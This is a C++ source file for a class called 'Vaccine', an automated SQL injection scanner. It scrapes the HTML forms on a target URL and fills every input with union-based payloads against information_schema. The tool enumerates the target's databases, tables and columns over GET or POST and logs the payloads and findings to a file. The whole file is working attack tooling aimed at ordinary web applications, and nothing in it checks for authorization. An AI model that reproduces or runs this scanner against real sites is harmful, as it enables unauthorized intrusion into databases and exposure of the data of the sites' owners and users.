#include "../../include/class/Vaccine.hpp"

Vaccine::Vaccine()
{
        this->_url = std::string();
        this->_request_type = std::string();
        this->_archive_file = std::string();
        this->_headers = std::vector< std::string >();
        this->_db_type = 0;

        this->_html = std::string();
        this->_html_doc = NULL;
        this->_forms = std::vector< xmlNode* >();

        this->_databases = std::map< std::string, std::vector< int > >();
        this->_tables = std::vector< std::map< std::string, int > >();
        this->_columns = std::vector< std::vector< std::string > >();
}

Vaccine::Vaccine(
    const std::string& url,
    const std::string& archive_file,
    const std::string& request_type,
    const std::vector< std::string >& headers,
    const short& _db_type)
{
        this->_url = url;
        this->_archive_file = archive_file;
        this->_request_type = request_type;
        this->_headers = headers;
        this->_db_type = _db_type;

        this->_html = std::string();
        this->_html_doc = NULL;
        this->_forms = std::vector< xmlNode* >();

        this->_databases = std::map< std::string, std::vector< int > >();
        this->_tables = std::vector< std::map< std::string, int > >();
        this->_columns = std::vector< std::vector< std::string > >();
}

Vaccine::Vaccine(const Vaccine& other)
{
        *this = other;
}

Vaccine::~Vaccine()
{
        if (this->_html_doc)
        {
                xmlFreeDoc(*this->_html_doc);
                delete this->_html_doc;
        }
}

Vaccine& Vaccine::operator=(const Vaccine& other)
{
        if (this != &other)
        {
                this->_url = other._url;
                this->_request_type = other._request_type;
                this->_archive_file = other._archive_file;
                this->_headers = other._headers;
                this->_db_type = other._db_type;

                this->_html = other._html;
                if (this->_html_doc)
                {
                        xmlFreeDoc(*this->_html_doc);
                        delete this->_html_doc;
                        this->_html_doc = NULL;
                }
                if (other._html_doc)
                        this->_html_doc = new htmlDocPtr(*other._html_doc);
                this->_forms = other._forms;

                this->_databases = other._databases;
                this->_tables = other._tables;
                this->_columns = other._columns;
        }
        return *this;
}

const std::string& Vaccine::get_url() const
{
        return this->_url;
}

const std::string& Vaccine::get_request_type() const
{
        return this->_request_type;
}

const std::string& Vaccine::get_archive_file() const
{
        return this->_archive_file;
}

const std::vector< std::string >& Vaccine::get_headers() const
{
        return this->_headers;
}

const short& Vaccine::get_db_type() const
{
        return this->_db_type;
}

const std::string& Vaccine::get_html() const
{
        return this->_html;
}

const std::vector< xmlNode* >& Vaccine::get_forms() const
{
        return this->_forms;
}

const std::map< std::string, std::vector< int > >& Vaccine::get_databases() const
{
        return this->_databases;
}

const std::vector< std::map< std::string, int > >& Vaccine::get_tables() const
{
        return this->_tables;
}

const std::vector< std::vector< std::string > >& Vaccine::get_columns() const
{
        return this->_columns;
}

void Vaccine::set_url(const std::string& url)
{
        this->_url = url;
}

void Vaccine::set_request_type(const std::string& request_type)
{
        this->_request_type = request_type;
}

void Vaccine::set_archive_file(const std::string& archive_file)
{
        this->_archive_file = archive_file;
}

void Vaccine::set_headers(const std::vector< std::string >& headers)
{
        this->_headers = headers;
}

void Vaccine::set_db_type(const short& db_type)
{
        this->_db_type = db_type;
}

bool Vaccine::fetch_data()
{
        if (!this->_fetch_html())
                return false;

        htmlDocPtr html_doc = htmlReadMemory(
            this->_html.c_str(),
            this->_html.size(),
            "noname.html",
            NULL,
            HTML_PARSE_RECOVER | HTML_PARSE_NOERROR | HTML_PARSE_NOWARNING);
        if (!html_doc)
        {
                std::cerr << "[ ERROR ] htmlReadMemory() failed." << std::endl;
                return false;
        }
        if (this->_html_doc)
        {
                xmlFreeDoc(*this->_html_doc);
                delete this->_html_doc;
                this->_html_doc = NULL;
        }
        this->_html_doc = new htmlDocPtr(html_doc);
        if (!this->_html_doc)
        {
                xmlFreeDoc(html_doc);
                xmlCleanupParser();
                std::cerr << "[ ERROR ] new htmlDocPtr() failed." << std::endl;
                return false;
        }
        this->_parse_html(xmlDocGetRootElement(*this->_html_doc));
        xmlCleanupParser();
        return true;
}

bool Vaccine::_fetch_html()
{
        CURL* curl = curl_easy_init();
        if (!curl)
        {
                std::cerr << "[ ERROR ] curl_easy_init() failed." << std::endl;
                return false;
        }
        this->_html.clear();
        curl_easy_setopt(curl, CURLOPT_URL, this->_url.c_str());
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, Vaccine::_curl_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &this->_html);
        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK)
        {
                std::cerr << "[ ERROR ] curl: " << curl_easy_strerror(res) << std::endl;
                curl_easy_cleanup(curl);
                return false;
        }
        curl_easy_cleanup(curl);
        return true;
}

void Vaccine::_parse_html(xmlNode* node)
{
        for (node = node; node; node = node->next)
        {
                if (node->type == XML_ELEMENT_NODE)
                        if (!xmlStrcasecmp(node->name, reinterpret_cast< const xmlChar* >("form")))
                                this->_forms.push_back(node);
                if (node->children)
                        this->_parse_html(node->children);
        }
}

void Vaccine::union_based()
{
        if (!this->_data_check())
                return;
        std::string uri;
        std::string full_url;
        std::string payload;
        std::string offset;
        std::vector< std::string > base_entries;
        std::vector< std::string > entries;
        std::vector< std::string > payloads;
        const std::vector< std::string > excluded = {
            "information_schema",
            "performance_schema",
            "sys",
            "mysql",
        };
        for (const auto& form : this->_forms)
        {
                this->_get_form_uri(form, uri);
                if (uri.empty())
                        continue;
                full_url = this->_url + uri;
                this->_get_form_entries(form, base_entries);
                // -------------------------------- DATABASES
                while (this->_databases.empty())
                {
                        payload = "' UNION SELECT " + offset + "schema_name " +
                                  "FROM information_schema.schemata-- ";
                        entries = this->_fill_entries(base_entries, payload);
                        if (!this->_fill_databases(this->_process(full_url, entries), excluded))
                                break;
                        if (this->_databases.empty())
                                offset += "null, ";
                }
                // -------------------------------- TABLES
                if (!this->_databases.empty())
                {
                        payloads.push_back(payload);
                        for (const auto& db : this->_databases)
                        {
                                payload = "' UNION SELECT " + offset + "table_name " +
                                          "FROM information_schema.tables " +
                                          "WHERE table_schema='" + db.first + "'-- ";
                                entries = this->_fill_entries(base_entries, payload);
                                this->_fill_tables(this->_process(full_url, entries), db.first);
                        }
                }
                // -------------------------------- COLUMNS
                if (!this->_tables.empty())
                {
                        payloads.push_back(payload);
                        for (const auto& db : this->_databases)
                        {
                                for (const auto& index : db.second)
                                {
                                        for (const auto& table : this->_tables[index])
                                        {
                                                payload = "' UNION SELECT " + offset + "column_name " +
                                                          "FROM information_schema.columns " +
                                                          "WHERE table_schema='" + db.first + "' " +
                                                          "AND table_name='" + table.first + "'-- ";
                                                entries = this->_fill_entries(base_entries, payload);
                                                this->_fill_columns(this->_process(full_url, entries), index, table.first);
                                        }
                                }
                        }
                }
                if (!this->_columns.empty())
                        payloads.push_back(payload);
                // -------------------------------- |
                this->_save_results(full_url, form, payloads);
                offset.clear();
                payloads.clear();
                this->_databases.clear();
                this->_tables.clear();
                this->_columns.clear();
        }
}

bool Vaccine::_data_check() const
{
        if (this->_html.empty())
        {
                std::cerr << "[ ERROR ] Please fetch_data() first." << std::endl;
                return false;
        }
        if (this->_forms.empty())
        {
                std::cerr << "[ ERROR ] " << this->_url << " has no managed SQLi entrypoint." << std::endl;
                return false;
        }
        return true;
}

void Vaccine::_get_form_uri(const xmlNode* node, std::string& uri) const
{
        if (!node || node->type != XML_ELEMENT_NODE ||
            xmlStrcasecmp(node->name, reinterpret_cast< const xmlChar* >("form")))
                return;

        xmlChar* action = xmlGetProp(node, reinterpret_cast< const xmlChar* >("action"));
        if (action)
        {
                uri = std::string(reinterpret_cast< char* >(action));
                xmlFree(action);
        }
}

void Vaccine::_get_form_entries(
    const xmlNode* node,
    std::vector< std::string >& entries) const
{
        if (!node)
                return;
        for (node = node->children; node; node = node->next)
        {
                if (node->children)
                        this->_get_form_entries(node, entries);
                if (!(node->type == XML_ELEMENT_NODE &&
                      !xmlStrcasecmp(node->name, reinterpret_cast< const xmlChar* >("input"))))
                        continue;

                xmlChar* id = xmlGetProp(node, reinterpret_cast< const xmlChar* >("id"));
                if (id)
                {
                        entries.push_back(std::string(reinterpret_cast< char* >(id)));
                        xmlFree(id);
                }
        }
}

std::vector< std::string > Vaccine::_fill_entries(
    const std::vector< std::string >& base_entries,
    const std::string& payload) const
{
        std::vector< std::string > entries(base_entries);
        for (auto& entry : entries)
                entry = "\"" + entry + "\": \"" + payload + "\"";
        return entries;
}

std::string Vaccine::_process(const std::string& full_url, const std::vector< std::string >& entries) const
{
        std::string buffer;
        CURL* curl = curl_easy_init();
        if (!curl)
        {
                std::cerr << "[ ERROR ] curl_easy_init() failed." << std::endl;
                return buffer;
        }
        struct curl_slist* header_list = curl_slist_append(NULL, "Content-Type: application/json");

        curl_easy_setopt(curl, CURLOPT_URL, std::string(full_url).c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, Vaccine::_curl_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &buffer);
        for (const auto& header : this->_headers)
                header_list = curl_slist_append(header_list, header.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, header_list);

        if (this->_request_type == "GET")
                this->_process_get(full_url, entries, &curl);
        if (this->_request_type == "POST")
                this->_process_post(entries, &curl);

        curl_easy_cleanup(curl);
        curl_slist_free_all(header_list);
        return buffer;
}

void Vaccine::_process_get(
    const std::string& full_url,
    const std::vector< std::string >& entries,
    CURL** curl) const
{
        CURLcode res;
        std::string key;
        std::string value;
        std::stringstream ss;
        std::string query = "?";
        char* encoded_value = NULL;
        for (const auto& entry : entries)
        {
                ss = std::stringstream(entry);
                std::getline(ss, key, ':');
                std::getline(ss, value);

                if (key.size() < 2 || value.size() < 3)
                        continue;
                key = key.substr(1, key.length() - 2);
                value = value.substr(2, value.length() - 3);
                encoded_value = curl_easy_escape(*curl, value.c_str(), 0);
                if (encoded_value)
                {
                        query += key + "=" + std::string(encoded_value) + "&";
                        curl_free(encoded_value);
                }
        }
        query.pop_back();

        std::string payload = full_url + query;
        curl_easy_setopt(*curl, CURLOPT_URL, payload.c_str());
        res = curl_easy_perform(*curl);
        if (res != CURLE_OK)
                std::cerr << "[ ERROR ] curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
}

void Vaccine::_process_post(const std::vector< std::string >& entries, CURL** curl) const
{
        CURLcode res;
        std::string payload = "{ ";
        for (const auto& entry : entries)
                payload += entry + ", ";
        if (payload.size() >= 2)
        {
                payload.pop_back();
                payload.pop_back();
        }
        payload += " }";
        curl_easy_setopt(*curl, CURLOPT_POSTFIELDSIZE, payload.size());
        curl_easy_setopt(*curl, CURLOPT_POSTFIELDS, payload.c_str());
        res = curl_easy_perform(*curl);
        if (res != CURLE_OK)
                std::cerr << "[ ERROR ] curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
}

bool Vaccine::_fill_databases(const std::string& response, const std::vector< std::string >& excluded)
{
        Json::Value root;
        std::string errors;
        Json::CharReaderBuilder builder;
        std::unique_ptr< Json::CharReader > reader(builder.newCharReader());
        if (!reader->parse(response.c_str(), response.c_str() + response.size(), &root, &errors))
        {
                std::cerr << "[ ERROR ] Could not parse server response." << std::endl;
                return false;
        }
        for (const auto& member : root.getMemberNames())
        {
                if (root[member].isArray())
                {
                        if (root[member].empty())
                                return false;

                        for (const auto& entry : root[member])
                        {
                                for (const auto& key : entry.getMemberNames())
                                {
                                        if (!entry[key].isNull())
                                        {
                                                bool is_excluded = false;
                                                for (const auto& exclude : excluded)
                                                        if (entry[key].asString() == exclude)
                                                                is_excluded = true;
                                                if (!is_excluded)
                                                        this->_databases[entry[key].asString()] = std::vector< int >();
                                                break;
                                        }
                                }
                        }
                        return true;
                }
        }
        return true;
}

void Vaccine::_fill_tables(const std::string& response, const std::string& db)
{
        Json::Value root;
        std::string errors;
        Json::CharReaderBuilder builder;
        std::unique_ptr< Json::CharReader > reader(builder.newCharReader());
        if (!reader->parse(response.c_str(), response.c_str() + response.size(), &root, &errors))
        {
                std::cerr << "[ ERROR ] Could not parse server response." << std::endl;
                return;
        }
        for (const auto& member : root.getMemberNames())
        {
                if (root[member].isArray())
                {
                        if (root[member].empty())
                                return;

                        const int index = this->_tables.size();
                        this->_tables.push_back(std::map< std::string, int >());
                        for (const auto& entry : root[member])
                        {
                                for (const auto& key : entry.getMemberNames())
                                {
                                        if (!entry[key].isNull())
                                        {
                                                this->_tables[index][entry[key].asString()] = -1;
                                                break;
                                        }
                                }
                        }
                        this->_databases[db].push_back(index);
                        break;
                }
        }
}

void Vaccine::_fill_columns(const std::string& response, const int& table_index, const std::string& table)
{
        Json::Value root;
        std::string errors;
        Json::CharReaderBuilder builder;
        std::unique_ptr< Json::CharReader > reader(builder.newCharReader());
        if (!reader->parse(response.c_str(), response.c_str() + response.size(), &root, &errors))
        {
                std::cerr << "[ ERROR ] Could not parse server response." << std::endl;
                return;
        }
        for (const auto& member : root.getMemberNames())
        {
                if (root[member].isArray())
                {
                        if (root[member].empty())
                                return;

                        const int index = this->_columns.size();
                        this->_columns.push_back(std::vector< std::string >());
                        for (const auto& entry : root[member])
                        {
                                for (const auto& key : entry.getMemberNames())
                                {
                                        if (!entry[key].isNull())
                                        {
                                                this->_columns[index].push_back(entry[key].asString());
                                                break;
                                        }
                                }
                        }
                        this->_tables[table_index][table] = index;
                        break;
                }
        }
}

void Vaccine::_save_results(
    const std::string& full_url,
    const xmlNode* gate,
    std::vector< std::string > payloads) const
{
        std::ofstream file(this->_archive_file, std::ios_base::app);
        if (!file.is_open())
        {
                std::cerr << "[ ERROR ] Could not open " << this->_archive_file << '.' << std::endl;
                return;
        }
        file << "========================= V A C C I N E =========================" << std::endl
             << "URL: " << full_url << std::endl
             << "REQUEST TYPE: " << this->_request_type << std::endl
             << "CUSTOM HEADERS: " << (this->_headers.empty() ? "none" : "") << std::endl;
        for (const auto& header : this->_headers)
                file << "\t" << header << std::endl;

        file << "GATE: <" << gate->name << ' ';
        for (xmlAttr* prop = gate->properties; prop; prop = prop->next)
        {
                xmlChar* value = xmlNodeListGetString(gate->doc, prop->children, 1);
                if (!value || prop->name == reinterpret_cast< const xmlChar* >("method"))
                        continue;
                file << prop->name << "=\"" << value << "\"";
                xmlFree(value);
                if (prop->next)
                        file << ' ';
        }
        file << ">" << std::endl;

        file << "PAYLOADS:" << std::endl;
        for (const auto& payload : payloads)
                file << "\t" << payload << std::endl;

        file << "-----------------------------------------------------------------" << std::endl;
        for (const auto& db : this->_databases)
        {
                file << "DATABASE: " << db.first << std::endl;
                for (const auto& index : db.second)
                {
                        for (const auto& table : this->_tables[index])
                        {
                                file << "\tTABLE: " << table.first << std::endl;
                                for (const auto& column : this->_columns[index])
                                        file << "\t\tCOLUMN: " << column << std::endl;
                        }
                }
        }
        file << "=================================================================" << std::endl
             << std::endl
             << std::endl;
}

size_t Vaccine::_curl_callback(char* ptr, size_t size, size_t nmemb, void* buffer)
{
        ((std::string*)buffer)->append((char*)ptr, size * nmemb);
        return size * nmemb;
}
